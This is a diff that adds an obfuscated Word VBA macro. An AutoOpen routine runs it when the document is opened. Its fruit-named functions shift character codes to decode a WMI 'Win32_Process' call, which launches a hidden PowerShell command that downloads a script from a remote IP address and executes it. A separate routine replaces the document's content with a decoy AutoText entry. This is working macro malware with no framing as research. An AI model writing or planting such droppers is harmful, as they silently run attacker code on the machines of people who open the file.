@@ -1,0 +1,41 @@
+Sub SubstitutePage()
+ActiveDocument.Content.Select
+Selection.Delete
+ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert
+Where:=Selection.Range, RichText:=True
+MyMacro
+End Sub
+Function Pears(Beets)
+Pears = Chr(Beets - 17)
+End Function
+Function Strawberries(Grapes)
+Strawberries = Left(Grapes, 3)
+End Function
+Function Almonds(Jelly)
+Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+Function Nuts(Milk)
+Do
+Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+Milk = Almonds(Milk)
+Loop While Len(Milk) > 0
+Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+ Dim Apples As String
+ Dim Water As String
+ Apples ="1291281361181311321211181251250490621181371181160491151381291141321320490621271281290
+49062136049121122117117118127049062116049122118137057057127118136062128115123118116133
+04913213813213311812606312711813306313611811511612512211812713305806311712813612712512
+81141171321331311221271200570561211331331290750640640660740670630660710730630660660740
+63066067065064115128128124063133137133056058058"
+ Water = Nuts(Apples)
+
+ GetObject(Nuts("136122127126120126133132075")).Get(Nuts("10412212706806711209713112811
+6118132132")).Create Water, Tea, Coffee, Napkin
+End Function
+
+Sub AutoOpen()
+MyMacro
+End Sub
